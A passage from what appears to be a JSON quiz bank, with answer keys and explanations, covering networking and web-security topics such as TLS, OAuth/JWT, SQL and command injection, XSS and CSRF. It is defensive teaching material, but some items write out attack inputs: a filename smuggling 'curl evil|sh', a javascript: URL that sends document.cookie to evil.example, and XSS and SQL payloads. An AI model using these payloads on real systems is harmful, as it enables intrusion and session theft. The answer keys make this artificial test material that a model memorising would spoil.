+    "id": "nw-dns-tcp-fallback",
+    "topic": "networking",
+    "subtopic": "dns",
+    "difficulty": "Expert",
+    "title": "DNSSEC lookups fail behind a firewall",
+    "question": "Resolution of a DNSSEC-signed domain with large responses fails intermittently from a network whose firewall allows only UDP port 53 outbound. Others resolve it fine. What is happening?",
+    "options": [
+      "Large answers come back truncated (TC bit) and the retry over TCP/53 is blocked",
+      "DNSSEC validation requires port 853, which this firewall does not allow",
+      "UDP checksums are invalid for any DNS message larger than 512 bytes",
+      "The firewall strips DNSSEC signatures, so resolvers reject the answers"
+    ],
+    "correctIndex": 0,
+    "explanation": "When a response exceeds the UDP payload size negotiated via EDNS, the server sets the truncation bit and the client must retry over TCP. TCP support is mandatory for DNS implementations, so blocking TCP/53 breaks exactly those large responses. Port 853 is DNS over TLS, not DNSSEC, and checksum validity does not depend on size.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc7766"
+  },
+  {
+    "id": "nw-http-cache-private",
+    "topic": "networking",
+    "subtopic": "http-https",
+    "difficulty": "Medium",
+    "title": "CDN served one user's page to another",
+    "question": "Behind a CDN, a user reported seeing another user's account page. The response had `Cache-Control: public, max-age=600` and was rendered from the session cookie. What is the correct fix?",
+    "options": [
+      "Add Vary: Accept-Encoding so each client gets its own copy",
+      "Mark personalised responses Cache-Control: private or no-store",
+      "Add an ETag so the CDN revalidates the page with the origin",
+      "Serve the page over HTTP/2 so each response uses its own stream"
+    ],
+    "correctIndex": 1,
+    "explanation": "public allows shared caches such as CDNs to store the response and serve it to anyone requesting the same URL. private restricts storage to the user's browser and no-store forbids caching altogether. Vary: Accept-Encoding still shares across users, an ETag only enables revalidation, and HTTP/2 streams have nothing to do with caching.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc9111"
+  },
+  {
+    "id": "nw-http3-head-of-line",
+    "topic": "networking",
+    "subtopic": "http-https",
+    "difficulty": "Hard",
+    "title": "Why HTTP/3 helps on lossy networks",
+    "question": "HTTP/2 already multiplexes many requests over one connection. Why does HTTP/3 still perform better on lossy mobile networks?",
+    "options": [
+      "HTTP/2 has no header compression, so its requests are far larger on the wire",
+      "HTTP/2 opens a separate TCP connection per request, multiplying handshakes",
+      "One lost TCP segment stalls every HTTP/2 stream; QUIC recovers streams independently",
+      "HTTP/3 drops TLS encryption, which removes a round trip from each request"
+    ],
+    "correctIndex": 2,
+    "explanation": "HTTP/2 removed application-level head-of-line blocking, but all streams share one TCP byte stream, so a single loss delays every stream until retransmission. QUIC runs over UDP and tracks loss per stream. HTTP/2 does have HPACK header compression and uses one connection, and HTTP/3 always uses TLS 1.3, integrated into QUIC.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc9114"
+  },
+  {
+    "id": "nw-tls-missing-intermediate",
+    "topic": "networking",
+    "subtopic": "tls",
+    "difficulty": "Medium",
+    "title": "Browsers work, curl does not",
+    "question": "After installing a new certificate, browsers load the site fine but curl and a Java client fail with 'unable to get local issuer certificate'. What is the most likely cause?",
+    "options": [
+      "The server does not send the root CA certificate, which every client requires",
+      "The clients do not send SNI, so the server returns its default certificate",
+      "The certificate has expired, but browsers apply a grace period",
+      "The server sends only its leaf certificate and not the intermediate CA certificate"
+    ],
+    "correctIndex": 3,
+    "explanation": "Clients need a chain from the leaf to a trusted root, and the server should send the leaf plus intermediates. Browsers often hide the misconfiguration by using cached intermediates or fetching them via the AIA extension, while most libraries do not. Roots are already in the client's trust store and need not be sent; an SNI or expiry problem gives different errors.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc8446"
+  },
+  {
+    "id": "nw-tls13-handshake-rtt",
+    "topic": "networking",
+    "subtopic": "tls",
+    "difficulty": "Easy",
+    "title": "TLS 1.3 handshake round trips",
+    "question": "With a full TLS 1.3 handshake (no resumption, no 0-RTT) over an established TCP connection, how many round trips pass before the client can send application data?",
+    "options": [
+      "2",
+      "1",
+      "0",
+      "3"
+    ],
+    "correctIndex": 1,
+    "explanation": "In TLS 1.3 the client sends its key share in ClientHello, the server replies with its key share, certificate and Finished in one flight, and the client can send its Finished together with application data. TLS 1.2 needed 2 round trips; 0 round trips are only possible with resumption and early data.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc8446"
+  },
+  {
+    "id": "nw-tls13-zero-rtt-replay",
+    "topic": "networking",
+    "subtopic": "tls",
+    "difficulty": "Hard",
+    "title": "Why 0-RTT data must be idempotent",
+    "question": "Why do servers typically accept TLS 1.3 0-RTT early data only for idempotent requests such as GET?",
+    "options": [
+      "Early data has no replay protection, so an attacker could resend it and repeat an action",
+      "Early data is sent unencrypted, so only public requests may use it",
+      "Early data is sent before SNI, so routing breaks for requests with bodies",
+      "The TLS specification limits early data to the HTTP GET method"
+    ],
+    "correctIndex": 0,
+    "explanation": "0-RTT data is encrypted with keys from a previous session's PSK, but the server cannot tell whether that first flight is being replayed, so a POST that charges a card could run twice. It is encrypted and SNI is in the same ClientHello. TLS knows nothing about HTTP methods; the restriction is an application-level policy.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc8446"
+  },
+  {
+    "id": "nw-tls-421-coalescing",
+    "topic": "networking",
+    "subtopic": "tls",
+    "difficulty": "Expert",
+    "title": "Connection coalescing hits the wrong vhost",
+    "question": "a.example and b.example share an IP and a certificate whose SAN covers both, but are configured as separate TLS vhosts. Browsers reuse the HTTP/2 connection opened for a.example to request b.example, and the server mishandles it. Which response makes the client retry on a fresh connection?",
+    "options": [
+      "400 Bad Request",
+      "503 Service Unavailable",
+      "421 Misdirected Request",
+      "426 Upgrade Required"
+    ],
+    "correctIndex": 2,
+    "explanation": "HTTP/2 allows a client to coalesce requests for another origin onto an existing connection when the certificate covers it and the IP matches. If the server cannot serve that origin on that connection, 421 tells the client to retry on a new connection, where SNI will select the right vhost. 400 and 503 are not retried this way, and 426 asks for a protocol upgrade.",
+    "referenceUrl": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/421"
+  },
+  {
+    "id": "nw-proxy-client-ip",
+    "topic": "networking",
+    "subtopic": "proxies-load-balancing",
+    "difficulty": "Medium",
+    "title": "Every request comes from the proxy IP",
+    "question": "Your app behind a reverse proxy logs the proxy's address as the client IP and rate-limits all users as one. What is the correct fix?",
+    "options": [
+      "Read the client IP from X-Forwarded-For or Forwarded, trusting only the known proxy's entries",
+      "Always use the leftmost X-Forwarded-For value, regardless of where the request came from",
+      "Switch the load balancer to layer 4 so the app sees TCP from the proxy directly",
+      "Rate-limit by User-Agent string instead, since it passes through proxies unchanged"
+    ],
+    "correctIndex": 0,
+    "explanation": "The proxy opens its own TCP connection, so the app must use the header the proxy adds. Clients can send forged X-Forwarded-For values, so take the entry appended by your trusted proxy (count from the right), not the leftmost. A layer 4 balancer does not change this without PROXY protocol or transparent mode, and User-Agent is trivially shared or spoofed.",
+    "referenceUrl": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Forwarded-For"
+  },
+  {
+    "id": "nw-lb-idle-timeout-502",
+    "topic": "networking",
+    "subtopic": "proxies-load-balancing",
+    "difficulty": "Hard",
+    "title": "Intermittent 502s behind a load balancer",
+    "question": "An Application Load Balancer has a 60-second idle timeout and reuses keep-alive connections to backends. Backends close idle keep-alive connections after 5 seconds. Under light traffic you see sporadic 502s. Why?",
+    "options": [
+      "The LB health checks are too frequent and mark healthy targets as down",
+      "The LB sends a request on a connection the backend just closed; make the backend timeout longer",
+      "HTTP/1.1 keep-alive is incompatible with load balancers, so it should be disabled",
+      "The backend's TCP receive buffer overflows when connections sit idle too long"
+    ],
+    "correctIndex": 1,
+    "explanation": "When the backend closes a pooled connection the LB still considers usable, the next request sent on it fails and the LB returns 502. AWS documentation recommends an application idle timeout larger than the load balancer's. Health checks cause target removal, not intermittent 502s, and keep-alive to backends is normal.",
+    "referenceUrl": "https://docs.aws.amazon.com/elasticloadbalancing/latest/application/edit-load-balancer-attributes.html"
+  },
+  {
+    "id": "nw-nat-inbound-unsolicited",
+    "topic": "networking",
+    "subtopic": "nat-firewall",
+    "difficulty": "Easy",
+    "title": "Reaching a host behind NAT",
+    "question": "Why can an external host not open a connection to a laptop behind a home NAT router unless port forwarding is configured?",
+    "options": [
+      "ISPs drop all inbound packets addressed to residential IP addresses",
+      "TCP does not allow a host behind NAT to act as a server",
+      "The NAT router encrypts internal addresses, so the packet cannot be decrypted",
+      "NAT only has mappings for outbound flows, so the router cannot tell which host should get it"
+    ],
+    "correctIndex": 3,
+    "explanation": "A NAT router shares one public address among many private hosts and creates translation entries when inside hosts send traffic out. An unsolicited inbound packet matches no entry, so it is dropped. Port forwarding adds a static mapping. TCP has no such restriction, ISPs generally do not block all inbound, and NAT does not encrypt anything.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc3022"
+  },
+  {
+    "id": "nw-firewall-stateless-nacl",
+    "topic": "networking",
+    "subtopic": "nat-firewall",
+    "difficulty": "Medium",
+    "title": "Stateless ACL breaks responses",
+    "question": "A subnet's network ACL allows inbound TCP 443 from anywhere and outbound TCP 443 to anywhere. Clients connect to a web server in the subnet, but their connections never complete. Why?",
+    "options": [
+      "Network ACLs only evaluate traffic between subnets, never to the internet",
+      "HTTPS also needs UDP 443 allowed for the TLS handshake to finish",
+      "The ACL is stateless; responses go to the client's ephemeral port, which outbound rules do not allow",
+      "Outbound rules are evaluated before inbound rules, so the SYN is dropped"
+    ],
+    "correctIndex": 2,
+    "explanation": "A stateful firewall or security group automatically permits return traffic for allowed connections. A stateless network ACL evaluates every packet independently, so server responses, which travel from port 443 to the client's ephemeral port, need an outbound rule covering the ephemeral range such as 1024-65535. TLS over TCP does not need UDP.",
+    "referenceUrl": "https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html"
+  },
+  {
+    "id": "nw-websocket-upgrade",
+    "topic": "networking",
+    "subtopic": "cdn-websocket",
+    "difficulty": "Easy",
+    "title": "How a WebSocket connection starts",
+    "question": "How is a WebSocket connection established?",
+    "options": [
+      "An HTTP/1.1 GET with Upgrade: websocket, answered by 101 Switching Protocols",
+      "A dedicated UDP handshake on a separate port negotiated in advance",
+      "An HTTP POST answered with 200 OK, after which frames are streamed",
+      "A TLS extension negotiated in ClientHello that switches the protocol"
+    ],
+    "correctIndex": 0,
+    "explanation": "The opening handshake is an HTTP request with Upgrade and Connection headers plus Sec-WebSocket-Key; the server proves it understood by returning 101 and Sec-WebSocket-Accept. The same TCP connection then carries WebSocket frames. Over HTTP/2, an extended CONNECT is used instead, but it is still HTTP, not UDP or TLS-level negotiation.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc6455"
+  },
+  {
+    "id": "nw-cdn-hashed-assets",
+    "topic": "networking",
+    "subtopic": "cdn-websocket",
+    "difficulty": "Medium",
+    "title": "Users still get the old JavaScript",
+    "question": "After each deploy, users get the old app.js from your CDN for hours. What is the standard fix?",
+    "options": [
+      "Set max-age=0 on every static asset so the CDN always fetches from origin",
+      "Purge the whole CDN on each deploy while keeping the same filenames",
+      "Content-hashed filenames with long immutable caching, and short caching for the HTML that references them",
+      "Append a random query string to each asset request in the browser"
+    ],
+    "correctIndex": 2,
+    "explanation": "When the filename changes with the content, a new deploy produces new URLs, so old cached files never need invalidation and can be cached for a year. Only the small HTML document needs short or revalidated caching. max-age=0 and random query strings defeat caching, and purging the CDN does not clear browsers' caches.",
+    "referenceUrl": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching"
+  },
+  {
+    "id": "nw-websocket-rebalancing",
+    "topic": "networking",
+    "subtopic": "cdn-websocket",
+    "difficulty": "Hard",
+    "title": "WebSocket load skewed after scale-out",
+    "question": "You scale a WebSocket service from 4 to 8 instances behind a load balancer, but the 4 original instances keep most of the load for hours. Why?",
+    "options": [
+      "Load balancers cannot route WebSocket traffic to instances added after startup",
+      "Balancing happens when a connection opens; long-lived connections stay put until they reconnect",
+      "WebSocket frames are routed per message, but the balancer caches routes per client IP",
+      "The new instances must first complete a WebSocket handshake with each old instance"
+    ],
+    "correctIndex": 1,
+    "explanation": "A load balancer chooses a target per new TCP connection. WebSocket connections can live for hours, so existing clients stay on the old instances and only new connections reach the new ones. Common fixes are least-connections routing plus having servers gracefully close a fraction of connections so clients reconnect and rebalance.",
+    "referenceUrl": "https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API"
+  },
+  {
+    "id": "sec-pwd-argon2id",
+    "topic": "security",
+    "subtopic": "passwords-authentication",
+    "difficulty": "Easy",
+    "title": "Storing user passwords",
+    "question": "Which approach is most appropriate for storing user passwords in a new system in 2026?",
+    "options": [
+      "SHA-256 with one application-wide salt",
+      "AES-256 encryption with the key kept in configuration",
+      "MD5 applied iteratively one thousand times",
+      "Argon2id with a unique random salt per password"
+    ],
+    "correctIndex": 3,
+    "explanation": "OWASP recommends Argon2id, a memory-hard password hashing function with a per-password salt, so each hash must be attacked separately and GPU cracking is expensive. A single fast SHA-256 with a shared salt is cheap to brute force, encryption is reversible by anyone who gets the key, and 1,000 rounds of MD5 is still far too fast.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-pwd-fast-hash",
+    "topic": "security",
+    "subtopic": "passwords-authentication",
+    "difficulty": "Easy",
+    "title": "Why fast hashes are bad for passwords",
+    "question": "Why is a salted SHA-256 hash still a poor choice for password storage?",
+    "options": [
+      "It is fast, so attackers with GPUs can test billions of guesses per second against leaked hashes",
+      "SHA-256 has practical collision attacks that let attackers forge a matching hash",
+      "SHA-256 cannot be combined with a salt without weakening its security properties",
+      "SHA-256 output is too long to store efficiently in common database columns"
+    ],
+    "correctIndex": 0,
+    "explanation": "General-purpose hashes are designed for speed, which is exactly what an offline attacker wants. Password hashing functions such as Argon2id, scrypt, bcrypt or PBKDF2 add a tunable work factor to slow each guess. SHA-256 has no practical collisions, salts work fine with it, and its 32-byte output is small.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-pwd-bcrypt-72-bytes",
+    "topic": "security",
+    "subtopic": "passwords-authentication",
+    "difficulty": "Hard",
+    "title": "Long passphrases and bcrypt",
+    "question": "Users of a bcrypt-based system notice that changing characters after the 72nd byte of a long passphrase does not affect whether they can log in. Why?",
+    "options": [
+      "bcrypt normalises Unicode and drops characters outside the ASCII range",
+      "The cost factor is set too low, so bcrypt skips trailing input",
+      "bcrypt only processes the first 72 bytes of input and ignores the rest",
+      "The 16-byte salt overwrites the last part of the password internally"
+    ],
+    "correctIndex": 2,
+    "explanation": "bcrypt has a 72-byte input limit; many implementations silently truncate longer inputs. OWASP notes this limit and recommends Argon2id for new systems; pre-hashing to work around it is risky and must be done carefully. Cost only changes iterations, and the salt is a separate parameter.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-pwd-upgrade-legacy-md5",
+    "topic": "security",
+    "subtopic": "passwords-authentication",
+    "difficulty": "Expert",
+    "title": "Migrating away from unsalted MD5",
+    "question": "You inherit 2 million unsalted MD5 password hashes and want Argon2id protection without forcing a mass reset. What is the recommended approach?",
+    "options": [
+      "Upgrade each user to Argon2id when they next log in and leave other accounts on MD5 until then",
+      "Crack the MD5 hashes offline to recover the passwords, then hash them with Argon2id",
+      "Add a salt column now and store the salt next to each existing MD5 hash",
+      "Wrap every hash now as Argon2id(md5_hash), then rehash with Argon2id directly on each user's next login"
+    ],
+    "correctIndex": 3,
+    "explanation": "Layering Argon2id over the existing hashes protects every account immediately, including inactive ones that would otherwise sit as plain MD5 for years. On login you verify via the layered scheme and replace it with a clean Argon2id hash of the password. Cracking users' passwords is unethical and incomplete, and adding a salt to an already-computed hash adds nothing.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-mfa-phishing-resistant",
+    "topic": "security",
+    "subtopic": "passwords-authentication",
+    "difficulty": "Medium",
+    "title": "MFA that resists phishing proxies",
+    "question": "Attackers use a reverse-proxy phishing kit that relays the real login page in real time. Which MFA method stops it?",
+    "options": [
+      "Time-based one-time codes from an authenticator app",
+      "WebAuthn / FIDO2 passkeys, whose signatures are bound to the site's origin",
+      "One-time codes delivered by SMS",
+      "Push notifications with an approve button"
+    ],
+    "correctIndex": 1,
+    "explanation": "With WebAuthn the browser includes the origin in what the authenticator signs, so a credential for bank.example never produces a valid assertion on the phishing domain. TOTP and SMS codes are typed by the user and can be relayed instantly, and push approvals can be relayed or fatigue-spammed.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-authz-idor",
+    "topic": "security",
+    "subtopic": "authorization",
+    "difficulty": "Easy",
+    "title": "Changing the ID in the URL",
+    "question": "A logged-in user changes /api/invoices/1001 to /api/invoices/1002 and receives another customer's invoice. What is this vulnerability?",
+    "options": [
+      "Cross-site request forgery against the invoices API",
+      "SQL injection through the invoice ID parameter",
+      "Session fixation on the authenticated user's session",
+      "Insecure direct object reference (broken object-level authorization)"
+    ],
+    "correctIndex": 3,
+    "explanation": "The server authenticates the user but never checks that the requested object belongs to them. The fix is an ownership or permission check on every object access, not hiding or obfuscating IDs. No forged cross-site request, injected SQL or fixed session is involved.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-authz-mass-assignment",
+    "topic": "security",
+    "subtopic": "authorization",
+    "difficulty": "Hard",
+    "title": "Becoming admin via a profile update",
+    "question": "`PATCH /api/users/me` binds the JSON body directly onto the User entity and saves it. An attacker sends `{\"displayName\":\"x\",\"role\":\"admin\"}` and becomes an admin. What is the right fix?",
+    "options": [
+      "Bind requests to a DTO with an allow-list of user-editable fields",
+      "Check in the UI that the role field is hidden for non-admin users",
+      "Validate that the role value is one of the known role names",
+      "Require HTTPS so attackers cannot add fields to the request body"
+    ],
+    "correctIndex": 0,
+    "explanation": "This is mass assignment: the framework sets any property named in the request. Binding to a dedicated input model containing only fields users may change (or an explicit allow-list) prevents privilege fields from being set. UI hiding is bypassed with any HTTP client, validating role names still lets 'admin' through, and TLS does not stop the sender.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-oidc-id-token",
+    "topic": "security",
+    "subtopic": "oauth-oidc-jwt",
+    "difficulty": "Easy",
+    "title": "What OpenID Connect adds to OAuth",
+    "question": "What does OpenID Connect add on top of OAuth 2.0?",
+    "options": [
+      "Mandatory encryption of access tokens sent to resource servers",
+      "An ID token describing the authenticated user, making OAuth usable for login",
+      "Refresh tokens, which plain OAuth 2.0 does not define",
+      "A password grant that replaces authorization codes"
+    ],
+    "correctIndex": 1,
+    "explanation": "OAuth 2.0 is an authorization framework for delegated API access; it does not tell the client who the user is. OIDC adds an identity layer: an ID token (a signed JWT with iss, sub, aud, exp, nonce) plus a UserInfo endpoint and discovery. Refresh tokens already exist in OAuth 2.0 and the password grant is discouraged.",
+    "referenceUrl": "https://openid.net/specs/openid-connect-core-1_0.html"
+  },
+  {
+    "id": "sec-oauth-pkce",
+    "topic": "security",
+    "subtopic": "oauth-oidc-jwt",
+    "difficulty": "Medium",
+    "title": "What PKCE protects",
+    "question": "A mobile app uses the OAuth authorization code flow with PKCE. Which attack does PKCE specifically prevent?",
+    "options": [
+      "Theft of access tokens from browser storage through XSS",
+      "Cross-site request forgery against the resource server's API",
+      "A stolen authorization code being redeemed by someone without the code_verifier",
+      "Replay of a valid access token at a different API"
+    ],
+    "correctIndex": 2,
+    "explanation": "The client sends a hash of a random code_verifier with the authorization request and the verifier itself when redeeming the code. An attacker who intercepts the code (for example via a malicious app registered for the same redirect scheme) cannot produce the verifier. PKCE does nothing about tokens already issued; it is now recommended for all clients, including confidential ones.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc7636"
+  },
+  {
+    "id": "sec-jwt-audience",
+    "topic": "security",
+    "subtopic": "oauth-oidc-jwt",
+    "difficulty": "Medium",
+    "title": "Token for one API accepted by another",
+    "question": "Your identity provider issues JWT access tokens for several APIs. A token issued for the low-privilege Reports API is accepted by the Payments API. Which validation is the Payments API missing?",
+    "options": [
+      "The expiry (exp) claim check",
+      "The not-before (nbf) claim check",
+      "The audience (aud) claim check",
+      "The JWT ID (jti) uniqueness check"
+    ],
+    "correctIndex": 2,
+    "explanation": "Both APIs trust the same issuer and signing key, so the signature is valid; only the aud claim says which recipient the token is meant for. Each API must reject tokens whose audience is not itself. exp and nbf validate time windows and jti helps detect replay, none of which distinguish APIs.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc8725"
+  },
+  {
+    "id": "sec-jwt-alg-confusion",
+    "topic": "security",
+    "subtopic": "oauth-oidc-jwt",
+    "difficulty": "Hard",
+    "title": "Forging an RS256 token with the public key",
+    "question": "An API expects RS256 tokens and calls `verify(token, publicKeyPem)` from a library that picks the algorithm from the token header. An attacker forges an admin token using only the published public key. What did they most likely do?",
+    "options": [
+      "Set alg to HS256 and signed with the public key bytes as the HMAC secret",
+      "Factored the RSA modulus from the public key to recover the private key",
+      "Re-signed the token with RS512 using the public key as the signing key",
+      "Removed the signature segment and kept alg set to RS256"
+    ],
+    "correctIndex": 0,
+    "explanation": "In algorithm confusion, the verifier treats the public key, which is known to everyone, as an HMAC secret because the header says HS256, so the attacker's HMAC validates. The fix is to pin the accepted algorithm and key type on the server rather than trusting the header. RSA keys of normal size cannot be factored, and a missing signature fails RS256 verification.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc8725"
+  },
+  {
+    "id": "sec-oauth-refresh-rotation-reuse",
+    "topic": "security",
+    "subtopic": "oauth-oidc-jwt",
+    "difficulty": "Expert",
+    "title": "Detecting a stolen refresh token",
+    "question": "An authorization server rotates refresh tokens on every use. It receives a refresh token that was already exchanged earlier. What should it do?",
+    "options": [
+      "Issue new tokens, because the token is still within its validity period",
+      "Treat it as likely theft and revoke the whole family of tokens from that grant",
+      "Reject only this request and leave the most recently issued token valid",
+      "Ask the client to re-authenticate the user with PKCE before issuing tokens"
+    ],
+    "correctIndex": 1,
+    "explanation": "With rotation, each refresh token is single-use. Seeing a used one again means two parties hold it (the legitimate client and an attacker), and the server cannot tell which is which, so the OAuth security BCP recommends invalidating the active refresh token for that grant. Rejecting only this request leaves the attacker's token working if they refreshed first.",
+    "referenceUrl": "https://www.rfc-editor.org/rfc/rfc9700"
+  },
+  {
+    "id": "sec-sqli-parameterized",
+    "topic": "security",
+    "subtopic": "injection",
+    "difficulty": "Easy",
+    "title": "Primary defence against SQL injection",
+    "question": "What is the primary defence against SQL injection when user input is used in a query's WHERE clause?",
+    "options": [
+      "Escaping single quotes in the input with a regular expression",
+      "Hiding database error messages from end users",
+      "Placing a web application firewall in front of the application",
+      "Parameterized queries (prepared statements) that bind input as data"
+    ],
+    "correctIndex": 3,
+    "explanation": "Parameterized queries send the SQL structure and the values separately, so input can never change the query's meaning. Hand-rolled escaping misses edge cases (encodings, numeric contexts), hiding errors only makes exploitation blind rather than impossible, and a WAF is a bypassable extra layer, not the fix.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-cmd-injection-shell",
+    "topic": "security",
+    "subtopic": "injection",
+    "difficulty": "Medium",
+    "title": "Shelling out with a user filename",
+    "question": "A Python service runs `subprocess.run(f\"convert {filename} out.png\", shell=True)` with a user-supplied filename. What is the best fix?",
+    "options": [
+      "Pass an argument list with shell=False and validate the filename, or use a library API",
+      "Wrap filename in double quotes inside the f-string before running it",
+      "Strip semicolons and ampersands from filename before running it",
+      "Run the command inside a container so the shell cannot reach the host"
+    ],
+    "correctIndex": 0,
+    "explanation": "With shell=True the string is parsed by /bin/sh, so input like 'a.jpg; curl evil|sh' runs extra commands. An argument list bypasses the shell entirely; you should still validate input and use '--' so a name like '-delete' is not treated as an option. Quoting and blocklists are easily bypassed with $(), backticks or newlines, and containers only reduce impact.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-path-traversal-join",
+    "topic": "security",
+    "subtopic": "injection",
+    "difficulty": "Hard",
+    "title": "Path traversal through os.path.join",
+    "question": "A download endpoint does `open(os.path.join(BASE_DIR, user_path))`, and you already reject any user_path containing '..'. An attacker requests user_path=/etc/passwd. What happens?",
+    "options": [
+      "os.path.join prepends BASE_DIR, producing BASE_DIR/etc/passwd, which is safe",
+      "Python raises ValueError because an absolute path cannot be joined",
+      "os.path.join discards BASE_DIR for an absolute path, so /etc/passwd is opened",
+      "open() refuses absolute paths unless the file is opened in binary mode"
+    ],
+    "correctIndex": 2,
+    "explanation": "When a later component of os.path.join is absolute, all previous components are thrown away. Blocking '..' is therefore not enough. The robust defence is to avoid user-controlled paths (use IDs), or resolve the canonical path and verify it is still inside the base directory.",
+    "referenceUrl": "https://owasp.org/www-community/attacks/Path_Traversal"
+  },
+  {
+    "id": "sec-xss-output-encoding",
+    "topic": "security",
+    "subtopic": "xss-csrf",
+    "difficulty": "Easy",
+    "title": "Core fix for stored XSS",
+    "question": "Users can post comments that are shown to other users, and an attacker stored `<script>` in one. What is the core fix?",
+    "options": [
+      "Removing the string <script> from comments before saving them",
+      "Serving the site over HTTPS with HSTS enabled",
+      "Storing comments base64-encoded in the database",
+      "Context-aware output encoding when rendering, e.g. a templating engine's auto-escaping"
+    ],
+    "correctIndex": 3,
+    "explanation": "XSS happens when data is interpreted as markup or code by the browser. Encoding at output for the specific context (HTML body, attribute, JavaScript, URL) turns it back into text. Blocklist filtering is bypassed with event handlers such as onerror, HTTPS does not affect content, and base64 storage changes nothing once the value is decoded and rendered.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-xss-javascript-url",
+    "topic": "security",
+    "subtopic": "xss-csrf",
+    "difficulty": "Medium",
+    "title": "XSS despite HTML auto-escaping",
+    "question": "A template engine HTML-escapes every variable. A profile page renders `<a href=\"{{ website }}\">My site</a>`. Which website value still leads to script execution?",
+    "options": [
+      "<script>alert(document.cookie)</script>",
+      "javascript:fetch('//evil.example?c='+document.cookie)",
+      "\"><img src=x onerror=alert(1)>",
+      "'; DROP TABLE users; --"
+    ],
+    "correctIndex": 1,
+    "explanation": "HTML escaping neutralises angle brackets and quotes, so the tag and attribute-breakout payloads are rendered harmlessly, but a javascript: URL contains nothing to escape and runs when clicked. URLs in href or src need scheme validation against an allow-list such as http and https. The last value is a SQL payload irrelevant to HTML rendering.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-csrf-samesite-lax",
+    "topic": "security",
+    "subtopic": "xss-csrf",
+    "difficulty": "Medium",
+    "title": "When SameSite=Lax cookies are still sent",
+    "question": "Your session cookie has SameSite=Lax. A page on evil.example triggers each of the following requests to your site. Which one still includes the session cookie?",
+    "options": [
+      "A POST form auto-submitted from a hidden iframe",
+      "A top-level GET navigation when the user clicks a link",
+      "A fetch() call made with credentials: 'include'",
+      "An <img> tag whose src points at your site"
+    ],
+    "correctIndex": 1,
+    "explanation": "Lax cookies are withheld on cross-site subrequests (images, iframes, fetch) and on cross-site POSTs, but are sent on top-level navigations using safe methods like GET. That is why state-changing actions must never be reachable via GET, and why SameSite complements rather than replaces CSRF tokens.",
+    "referenceUrl": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie"
+  },
+  {
+    "id": "sec-xss-dom-fragment",
+    "topic": "security",
+    "subtopic": "xss-csrf",
+    "difficulty": "Hard",
+    "title": "XSS the WAF never sees",
+    "question": "A page runs `document.getElementById('msg').innerHTML = decodeURIComponent(location.hash.slice(1))`. Attacks succeed, yet neither the WAF nor server logs show any payload. Why, and what is the fix?",
+    "options": [
+      "The WAF decodes URL encoding only once; enable recursive decoding in its rules",
+      "The server strips the payload before logging it; log raw request bodies instead",
+      "Browsers send fragments only over HTTP/2; force HTTP/1.1 so the WAF inspects them",
+      "The fragment is never sent to the server; use textContent or Trusted Types instead of innerHTML"
+    ],
+    "correctIndex": 3,
+    "explanation": "Everything after # stays in the browser, so this DOM-based XSS bypasses any server-side inspection. The sink is innerHTML; writing with textContent treats the value as text, and Trusted Types can enforce that dangerous sinks only receive sanitised values. No HTTP version sends fragments.",
+    "referenceUrl": "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "sec-csrf-naive-double-submit",
+    "topic": "security",
+    "subtopic": "xss-csrf",
+    "difficulty": "Hard",
+    "title": "Weakness of naive double-submit cookies",
+    "question": "An app defends CSRF by checking that a header value equals a random csrf cookie value (naive double submit). The attacker controls a sibling subdomain. How can they bypass it?",
+    "options": [
+      "Set their own csrf cookie for the parent domain and send the matching value in the request",
+      "Read the victim's csrf cookie from the sibling subdomain through the CORS preflight",
+      "Replay the header captured from an earlier request, since the value never expires",
+      "Remove the Origin header so the server skips the comparison entirely"
+    ],
+    "correctIndex": 0,
+    "explanation": "The server only checks that the two values match, not that it issued them. A sibling subdomain (or a network attacker on plain HTTP) can plant a cookie for the shared parent domain, then make both sides match. OWASP recommends the signed double-submit variant, where the token is an HMAC bound to the user's session.",
